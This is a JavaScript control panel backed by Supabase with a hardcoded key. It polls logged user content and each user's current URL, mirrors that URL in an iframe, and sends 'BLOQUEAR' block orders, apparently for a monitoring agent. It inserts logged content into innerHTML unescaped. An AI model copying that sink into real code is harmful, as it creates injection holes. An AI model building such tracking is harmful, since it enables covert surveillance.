const SB_URL = "https://gmvczheriaqouwynfdyv.supabase.co";
const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdtdmN6aGVyaWFxb3V3eW5mZHl2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA0MTM1OTQsImV4cCI6MjA4NTk4OTU5NH0.22wbgR33dCQ1vfB_EdWpxGY5w811_jsf1dqbU1P6dQs";

async function refresh() {
    const res = await fetch(`${SB_URL}/rest/v1/logs?select=*&order=timestamp.desc&limit=10`, {
        headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}` }
    });
    const logs = await res.json();
    
    if(logs.length > 0) {
        document.getElementById('logs-body').innerHTML = logs.map(l => `
            <tr><td>${l.usuario_id}</td><td>${l.contenido}</td><td>${new Date(l.timestamp).toLocaleTimeString()}</td></tr>
        `).join('');
        
        const monitor = document.getElementById('live-screen');
        if(monitor.src !== logs[0].url_actual) monitor.src = logs[0].url_actual;
    }
}

async function enviarBloqueo() {
    const user = document.getElementById('target').value;
    await fetch(`${SB_URL}/rest/v1/ordenes`, {
        method: 'POST',
        headers: { 'apikey': SB_KEY, 'Authorization': `Bearer ${SB_KEY}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ usuario_id: user, orden: "BLOQUEAR", activa: true })
    });
    alert("Usuario " + user + " bloqueado.");
}

setInterval(refresh, 3000);
